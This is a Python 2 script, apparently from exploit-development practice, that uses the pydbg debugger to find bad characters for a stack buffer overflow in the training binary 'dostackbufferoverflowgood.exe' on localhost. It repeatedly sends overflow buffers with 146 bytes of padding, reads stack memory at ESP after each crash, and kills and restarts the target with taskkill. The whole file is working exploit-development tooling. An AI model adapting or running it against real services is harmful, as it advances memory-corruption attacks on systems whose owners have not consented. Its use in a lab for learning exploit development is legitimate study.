from pydbg import *
from pydbg.defines import *
import sys, time, socket, os, time, threading, re, subprocess

LHOST = '127.0.0.1'
LPORT = 31337
Path = 'C:\\Users\\dp365\\Downloads\\dostackbufferoverflowgood.exe'

def debugger_run(dbg, test_char):
	print "Sending Crash"
	time.sleep(2) #sleep for thread to start properly
	crash(test_char*50)
	time.sleep(2) #wait for timeout for it to crash
	if goCrash == False:
		print "Timeout: Bad Char Found"
		crash("A"*1024 )
		restart_process()

def crash(buff):
	buffer = "A"*146 + buff + "abcde" + "\r\n"
	p = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
	p.connect((LHOST,LPORT))
	p.send(buffer)
	p.close()

def find_pid():
	tasklist = os.popen('tasklist | find "buffer" ').read()
	if "dostackbufferoverflowgood" in tasklist:
		pid = int(re.findall('dostackbufferoverflowgood\W*(\d+)\W',tasklist)[0])
		return pid
	else:
		return None

def access_violetion_handler(dbg):
	#Access Violation Handler function: read data from a pointer on the stack once an AV has been thrown.
	global goCrash, current_char, goodchar, badchar
	goCrash = True
	print "Access Violation Caught!"
	
	# If payload lands at offset from esp
	# esp_offset = 0x4C
	# raw_address = dbg.read(dbg.context.Esp + esp_offset, 0x4)
	# address = dbg.flip_endian_dword(raw_address)
	
	# Get the pointer to esp
	address = dbg.context.Esp
	## Read the buffer
	buffer = dbg.read(address, 0x73) # reads first 115 bytes
	## Identifies bad chars
	if (current_char+"abcde") in buffer:
		print "GG GOOD CHAR"
		goodchar = goodchar + current_char
	else:
		print "Bad Character :("
		badchar = badchar + current_char
	## Detach the debugger
	dbg.detach()
	print "\r\n"
	restart_process()
	return DBG_EXCEPTION_NOT_HANDLED

def newDebuggee(pid):
	#Create a debugger instance and attach to ovas PID
	print "Attacching debugger to pid:%d" % pid
	dbg = pydbg()
	dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, access_violetion_handler)
	while True:
		try:
			if dbg.attach(pid):
				return dbg
			else:
				return False
		except:
			print "Error in attaching..."
			restart_process()
			time.sleep(5)

def restart_process():
	stop = 'taskkill /F /IM dostackbufferoverflowgood.exe > nul 2>&1'
	start = Path
	os.system(stop)
	p = subprocess.Popen([start], close_fds=True)

goodchar = ""
badchar = ""

for i in range (0,256):
	goCrash = False
	current_char = chr(i)
	print "testing: " + hex(i)
	pid = find_pid()
	if pid == None:
		restart_process()
		pid = find_pid()
	dbg = newDebuggee(pid)
	#Creating threads
	crash_thread = threading.Thread(target=debugger_run, args=(dbg,current_char))
	crash_thread.start()
	#Starts debugger
	dbg.run()
	crash_thread.join() # Waits for thread to close
	print "Good Characters: " + "".join("\\x{:02x}".format(ord(c)) for c in goodchar)
	print "Bad Characters: " + "".join("\\x{:02x}".format(ord(c)) for c in badchar)

print "Good Characters: " + "".join("\\x{:02x}".format(ord(c)) for c in goodchar)
print "Bad Characters: " + "".join("\\x{:02x}".format(ord(c)) for c in badchar)
